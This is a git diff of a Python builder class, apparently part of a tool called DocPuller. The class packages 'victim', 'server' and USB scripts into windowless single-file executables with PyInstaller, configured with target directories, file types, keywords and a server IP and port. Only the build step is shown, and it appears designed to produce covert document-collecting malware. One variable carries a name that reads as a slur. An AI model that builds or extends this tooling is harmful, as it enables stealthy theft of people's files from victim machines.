@@ -19,15 +19,16 @@ class DocPullerGenerator:
         self.keywords = keywords
         self.server_ip = server_ip
         self.server_port = server_port
-        self.DOCPULLER_USB_EXE_PATH = r'C:\Users\ibena\Documents\GitHub\DocPuller\Generator\DocPullerScriptsToExe\DocPullerUSB_Exe.py'
-        self.DOCPULLER_FTP_SERVER_EXE_PATH = 'Generator/DocPullerScriptsToExe/DocPullerTCP_Server_Exe.py'
-        self.DOCPULLER_FTP_VICTIM_EXE_PATH = 'Generator/DocPullerScriptsToExe/DocPullerTCP_Victim_Exe.py'
+        self.DOCPULLER_USB_EXE_PATH = r'../docpuller_usb_exe_v2.py'
+        self.DOCPULLER_FTP_SERVER_EXE_PATH = 'DocPullerScriptsToExe/DocPullerTCP_Server_Exe.py'
+        self.DOCPULLER_FTP_VICTIM_EXE_PATH = 'DocPullerScriptsToExe/DocPullerTCP_Victim_Exe.py'
 
         # Specify additional PyInstaller options if needed
         self.options = [
             "--onefile",
             "--noconsole",
-            f"--distpath={self.save_dir}"
+            f"--distpath={self.save_dir}",
+            f'--add-data /DocPullerScripts'
         ]
 
         FrozenObjectGeneartor(is_usb, direcoties, file_type, date, keywords, server_ip, server_port).main()
@@ -36,9 +37,10 @@ class DocPullerGenerator:
         if self.is_usb:
             print('genarating exe')
 
-            command = ["pyinstaller", self.DOCPULLER_USB_EXE_PATH] + self.options
-            subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            command = ["pyinstaller",'--onefile',f"--distpath={self.save_dir}",f'--add-data /DocPullerScripts',self.DOCPULLER_USB_EXE_PATH]
+            nig=subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              universal_newlines=True)
+            print(nig)
         else:
             command = ["pyinstaller", self.DOCPULLER_FTP_SERVER_EXE_PATH] + self.options
             subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
